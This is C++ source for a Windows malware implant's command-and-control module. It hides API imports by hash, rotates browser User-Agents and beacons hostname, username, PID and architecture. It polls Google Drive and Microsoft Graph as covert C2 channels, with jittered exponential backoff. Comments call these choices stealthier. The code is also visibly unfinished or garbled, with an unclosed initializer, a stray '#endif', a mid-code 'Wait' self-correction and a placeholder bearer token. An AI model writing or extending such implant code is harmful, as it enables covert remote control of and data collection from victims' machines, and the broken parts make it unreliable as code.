#include <windows.h>
#include <winhttp.h>
#include <stdint.h>
#include <vector>
#include "crypto.h"
#include "api_hashes.h"

// =============================================================================
// CONFIGURATION
// =============================================================================

#define C2_JITTER_PERCENT   20
#define C2_MAX_RETRIES      8
#define C2_INITIAL_BACKOFF  2000   // 2 seconds
#define C2_MAX_BACKOFF      300000 // 5 minutes
#define MAX_COMMAND_LEN     8192

typedef struct _C2_CONFIG {
    uint8_t  encryptedToken[256];
    uint8_t  nonce[CHACHA_NONCE_SIZE];
    uint32_t checkInterval;          // Base interval in ms
    WCHAR    gdriveEndpoint[256];
    WCHAR    msgraphEndpoint[256];
    DWORD    consecutiveFailures;
    DWORD    currentBackoff;
} C2_CONFIG;

static C2_CONFIG g_C2 = {
    { 0xAB, 0xCD, 0xEF /* ... encrypted token data placeholder ... */ },
    { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C },
    60000,  // 1 minute
    L"https://www.googleapis.com/drive/v3/files?pageSize=1",
    L"https://graph.microsoft.com/v1.0/me/drive/root/children",
    0,
    C2_INITIAL_BACKOFF
// Pool de User-Agents para rotación (ofuscados o reales)
static const wchar_t* USER_AGENTS_POOL[] = {
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    L"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/114.0",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/114.0.1823.43"
};
#define NUM_USER_AGENTS (sizeof(USER_AGENTS_POOL) / sizeof(USER_AGENTS_POOL[0]))

static HINTERNET g_hSession = NULL;
static HINTERNET g_hConnect = NULL;

static BOOL InitializeWinHttp() {
    if (g_hSession) return TRUE;

    // Resolver WinHttpOpen dinámicamente o usar hashes (preferido en este proyecto)
    PVOID hWinHttp = GetModuleBaseByHash(HASH_NTDLL); // Wait, WinHttp is in winhttp.dll
    // Need to load winhttp.dll first
    typedef HMODULE (WINAPI *LoadLibraryW_t)(LPCWSTR);
    LoadLibraryW_t pLLW = (LoadLibraryW_t)ResolveApiByHash(GetModuleBaseByHash(HASH_KERNEL32), HASH_LoadLibraryW);
    HMODULE hLib = pLLW(L"winhttp.dll");
    if (!hLib) return FALSE;

    typedef HINTERNET (WINAPI *WinHttpOpen_t)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
    WinHttpOpen_t pOpen = (WinHttpOpen_t)ResolveApiByHash(hLib, HASH_WinHttpOpen);
    
    // Rotar User-Agent
    LARGE_INTEGER pc;
    QueryPerformanceCounter(&pc);
    int ua_index = pc.LowPart % NUM_USER_AGENTS;

    g_hSession = pOpen(USER_AGENTS_POOL[ua_index], WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    return (g_hSession != NULL);
}

static void BuildBeaconInfo(char *buf, DWORD bufSize) {
    if (!buf || bufSize < 128) return;

    wchar_t compName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD compSize = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(compName, &compSize);

    wchar_t userName[256] = {0};
    DWORD userSize = 256;
    GetUserNameW(userName, &userSize);

    OSVERSIONINFOW osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);

    // Format: hostname|user|pid|arch
    DWORD pid = GetCurrentProcessId();
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    const char *arch = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" : "x86";

    // Simple ASCII conversion
    char host[64] = {0}, user[64] = {0};
    for (DWORD i = 0; i < compSize && i < 63; i++) host[i] = (char)compName[i];
    for (DWORD i = 0; i < userSize && i < 63; i++) user[i] = (char)userName[i];

    // Manual snprintf-like formatting (avoid stdio)
    int pos = 0;
    // host
    for (int i = 0; host[i] && pos < (int)bufSize - 32; i++) buf[pos++] = host[i];
    buf[pos++] = '|';
    // user
    for (int i = 0; user[i] && pos < (int)bufSize - 24; i++) buf[pos++] = user[i];
    buf[pos++] = '|';
    // pid (simple decimal)
    char pidStr[16];
    int pidLen = 0;
    DWORD tmp = pid;
    do { pidStr[pidLen++] = '0' + (tmp % 10); tmp /= 10; } while (tmp > 0);
    for (int i = pidLen - 1; i >= 0 && pos < (int)bufSize - 8; i--) buf[pos++] = pidStr[i];
    buf[pos++] = '|';
    // arch
    for (int i = 0; arch[i] && pos < (int)bufSize - 1; i++) buf[pos++] = arch[i];
    buf[pos] = '\0';
}

// =============================================================================
// COM-BASED HTTP REQUEST WITH PROPER CLEANUP
// =============================================================================

// =============================================================================
// WINHTTP-BASED HTTP REQUEST (Stealthier than COM)
// =============================================================================

static BOOL HttpRequest(LPCWSTR url, char *outBuf, DWORD outBufSize, DWORD *bytesReceived) {
    if (!InitializeWinHttp()) return FALSE;

    HMODULE hWinHttp = GetModuleHandleW(L"winhttp.dll");
    typedef HINTERNET (WINAPI *WinHttpConnect_t)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
    typedef HINTERNET (WINAPI *WinHttpOpenRequest_t)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
    typedef BOOL (WINAPI *WinHttpSendRequest_t)(HINTERNET, LPCWSTR, DWORD, PVOID, DWORD, DWORD, DWORD_PTR);
    typedef BOOL (WINAPI *WinHttpReceiveResponse_t)(HINTERNET, LPVOID);
    typedef BOOL (WINAPI *WinHttpReadData_t)(HINTERNET, LPVOID, DWORD, LPDWORD);
    typedef BOOL (WINAPI *WinHttpCloseHandle_t)(HINTERNET);

    WinHttpConnect_t pConnect = (WinHttpConnect_t)ResolveApiByHash(hWinHttp, HASH_WinHttpConnect);
    WinHttpOpenRequest_t pOpenReq = (WinHttpOpenRequest_t)ResolveApiByHash(hWinHttp, HASH_WinHttpOpenRequest);
    WinHttpSendRequest_t pSendReq = (WinHttpSendRequest_t)ResolveApiByHash(hWinHttp, HASH_WinHttpSendRequest);
    WinHttpReceiveResponse_t pRecvResp = (WinHttpReceiveResponse_t)ResolveApiByHash(hWinHttp, HASH_WinHttpReceiveResponse);
    WinHttpReadData_t pReadData = (WinHttpReadData_t)ResolveApiByHash(hWinHttp, HASH_WinHttpReadData);
    WinHttpCloseHandle_t pClose = (WinHttpCloseHandle_t)ResolveApiByHash(hWinHttp, HASH_WinHttpCloseHandle);

    // Parse URL (simplified)
    // For this project we assume URLs like "https://www.googleapis.com/..."
    const wchar_t* hostname = L"www.googleapis.com";
    const wchar_t* path = url + 25; // Skip "https://www.googleapis.com"
    if (url[8] == L'g') { // graph.microsoft.com
        hostname = L"graph.microsoft.com";
        path = url + 26;
    }

    HINTERNET hConnect = pConnect(g_hSession, hostname, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) return FALSE;

    HINTERNET hRequest = pOpenReq(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { pClose(hConnect); return FALSE; }

    // Set authorization header
    uint8_t tokenKey[CHACHA_KEY_SIZE];
    DeriveKeyFromHWID(tokenKey);
    // Placeholder for real decryption logic
    pSendReq(hRequest, L"Authorization: Bearer [TOKEN_PLACEHOLDER]\r\n", -1L, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    SecureWipe(tokenKey, sizeof(tokenKey));

    BOOL success = FALSE;
    if (pRecvResp(hRequest, NULL)) {
        DWORD downloaded = 0;
        if (pReadData(hRequest, outBuf, outBufSize, &downloaded)) {
            if (bytesReceived) *bytesReceived = downloaded;
            success = TRUE;
        }
    }

    pClose(hRequest);
    pClose(hConnect);
    return success;
}

// =============================================================================
// EXPONENTIAL BACKOFF WITH JITTER
// =============================================================================

static DWORD CalculateBackoff() {
    DWORD backoff = g_C2.currentBackoff;

    // Add jitter: ±C2_JITTER_PERCENT
    DWORD jitterRange = (backoff * C2_JITTER_PERCENT) / 100;
    if (jitterRange > 0) {
        DWORD jitter = GetTickCount() % (2 * jitterRange + 1);
        backoff = backoff - jitterRange + jitter;
    }

    return backoff;
}

static void OnRequestSuccess() {
    g_C2.consecutiveFailures = 0;
    g_C2.currentBackoff = C2_INITIAL_BACKOFF;
}

static void OnRequestFailure() {
    g_C2.consecutiveFailures++;
    // Exponential backoff: double each failure, cap at max
    g_C2.currentBackoff = g_C2.currentBackoff * 2;
    if (g_C2.currentBackoff > C2_MAX_BACKOFF) g_C2.currentBackoff = C2_MAX_BACKOFF;
}

// =============================================================================
// GDRIVE + MS GRAPH FALLBACK C2
// =============================================================================

static BOOL GDrive_CheckForCommandsEx(char *buffer, DWORD bufferSize, DWORD *bytesReceived) {
    if (bytesReceived) *bytesReceived = 0;

    // Try Google Drive first
    BOOL ok = HttpRequest(g_C2.gdriveEndpoint, buffer, bufferSize, bytesReceived);
    if (ok) {
        OnRequestSuccess();
        return TRUE;
    }

    // Fallback: Microsoft Graph API
    ok = HttpRequest(g_C2.msgraphEndpoint, buffer, bufferSize, bytesReceived);
    if (ok) {
        OnRequestSuccess();
        return TRUE;
    }

    // Both failed – apply exponential backoff
    OnRequestFailure();

    // Wait with backoff before caller retries
    DWORD waitMs = CalculateBackoff();
    Sleep(waitMs);

    return FALSE;
}

// =============================================================================
// LEGACY COMPATIBILITY WRAPPER
// =============================================================================

static BOOL GDrive_CheckForCommands(char *buffer, DWORD bufferSize) {
    DWORD received = 0;
    return GDrive_CheckForCommandsEx(buffer, bufferSize, &received);
}

#endif
